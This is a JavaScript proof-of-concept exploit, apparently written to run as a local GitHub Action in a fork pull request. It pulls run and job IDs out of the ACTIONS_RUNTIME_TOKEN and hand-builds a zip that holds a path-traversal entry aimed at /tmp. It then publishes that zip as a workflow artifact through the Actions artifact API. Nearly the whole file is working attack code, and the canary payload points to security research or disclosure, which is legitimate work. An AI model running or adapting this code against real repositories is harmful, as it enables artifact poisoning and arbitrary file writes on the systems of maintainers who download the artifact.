// Runs as a LOCAL action (uses: ./) inside a fork pull_request job.
// That context has NO secrets and a read-only GITHUB_TOKEN, but it DOES
// receive ACTIONS_RUNTIME_TOKEN, which is all that is required to publish
// an artifact for this run.
const T = (() => { const t=[]; for (let n=0;n<256;n++){ let c=n;
  for (let k=0;k<8;k++) c = (c&1) ? (0xEDB88320 ^ (c>>>1)) : (c>>>1); t[n]=c>>>0; } return t; })();
function crc32(b){ let c=0xFFFFFFFF; for (let i=0;i<b.length;i++) c=T[(c^b[i])&0xFF]^(c>>>8); return (c^0xFFFFFFFF)>>>0; }

function zipStored(entries){
  const locals=[], central=[]; let offset=0;
  for (const e of entries){
    const name=Buffer.from(e.name,'utf8'), data=Buffer.from(e.data,'utf8'), crc=crc32(data);
    const lh=Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50,0); lh.writeUInt16LE(20,4); lh.writeUInt16LE(0,6);
    lh.writeUInt16LE(0,8); lh.writeUInt16LE(0,10); lh.writeUInt16LE(0,12);
    lh.writeUInt32LE(crc,14); lh.writeUInt32LE(data.length,18); lh.writeUInt32LE(data.length,22);
    lh.writeUInt16LE(name.length,26); lh.writeUInt16LE(0,28);
    locals.push(lh,name,data);
    const ch=Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50,0); ch.writeUInt16LE(20,4); ch.writeUInt16LE(20,6);
    ch.writeUInt16LE(0,8); ch.writeUInt16LE(0,10); ch.writeUInt16LE(0,12); ch.writeUInt16LE(0,14);
    ch.writeUInt32LE(crc,16); ch.writeUInt32LE(data.length,20); ch.writeUInt32LE(data.length,24);
    ch.writeUInt16LE(name.length,28); ch.writeUInt16LE(0,30); ch.writeUInt16LE(0,32);
    ch.writeUInt16LE(0,34); ch.writeUInt16LE(0,36); ch.writeUInt32LE(0,38); ch.writeUInt32LE(offset,42);
    central.push(ch,name);
    offset += 30 + name.length + data.length;
  }
  const lo=Buffer.concat(locals), cd=Buffer.concat(central);
  const eocd=Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50,0); eocd.writeUInt16LE(0,4); eocd.writeUInt16LE(0,6);
  eocd.writeUInt16LE(entries.length,8); eocd.writeUInt16LE(entries.length,10);
  eocd.writeUInt32LE(cd.length,12); eocd.writeUInt32LE(lo.length,16); eocd.writeUInt16LE(0,20);
  return Buffer.concat([lo,cd,eocd]);
}

(async () => {
  const tok  = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = process.env.ACTIONS_RESULTS_URL;
  console.log("runtime token present :", !!tok);
  console.log("results url           :", base);
  const claims = JSON.parse(Buffer.from(tok.split('.')[1],'base64').toString());
  const scp = Array.isArray(claims.scp) ? claims.scp.join(' ') : String(claims.scp);
  console.log("scp claim             :", scp);
  const m = /Actions\.Results:([0-9a-f-]+):([0-9a-f-]+)/i.exec(scp);
  const runId = m[1], jobId = m[2];
  console.log("workflow_run_backend_id     :", runId);
  console.log("workflow_job_run_backend_id :", jobId);

  const TRAVERSAL = "../../../../../../../../tmp/CANARY_TARGET";
  const zip = zipStored([
    { name: "benign.txt", data: "ordinary build output\n" },
    { name: TRAVERSAL,   data: "WRITTEN_BY_FORK_PR_ARTIFACT rid=" + runId + "\n" },
  ]);
  console.log("crafted zip bytes     :", zip.length);
  console.log("traversal entry name  :", TRAVERSAL);

  const svc = base.replace(/\/$/,'') + "/twirp/github.actions.results.api.v1.ArtifactService/";
  const hdrs = { "Content-Type":"application/json", "Authorization":"Bearer "+tok };

  let r = await fetch(svc+"CreateArtifact", { method:"POST", headers:hdrs, body: JSON.stringify({
    workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId,
    name: "poc", version: 4 }) });
  const created = await r.json();
  console.log("CreateArtifact        :", r.status, JSON.stringify(created).slice(0,160));
  if (!created.signed_upload_url) throw new Error("no signed_upload_url");

  const put = await fetch(created.signed_upload_url + "&comp=block&blockid=" +
      Buffer.from("block0").toString("base64"), {
    method:"PUT", headers:{ "x-ms-blob-type":"BlockBlob", "Content-Type":"application/zip" }, body: zip });
  console.log("block upload          :", put.status);
  const commit = await fetch(created.signed_upload_url + "&comp=blocklist", {
    method:"PUT", headers:{"Content-Type":"application/xml"},
    body: '<?xml version="1.0" encoding="utf-8"?><BlockList><Latest>' +
          Buffer.from("block0").toString("base64") + '</Latest></BlockList>' });
  console.log("blocklist commit      :", commit.status);

  const sha = require('crypto').createHash('sha256').update(zip).digest('hex');
  r = await fetch(svc+"FinalizeArtifact", { method:"POST", headers:hdrs, body: JSON.stringify({
    workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId,
    name: "poc", size: zip.length, hash: "sha256:"+sha }) });
  console.log("FinalizeArtifact      :", r.status, (await r.text()).slice(0,160));
})().catch(e => { console.log("EXPLOIT ERROR:", e.message); process.exit(0); });
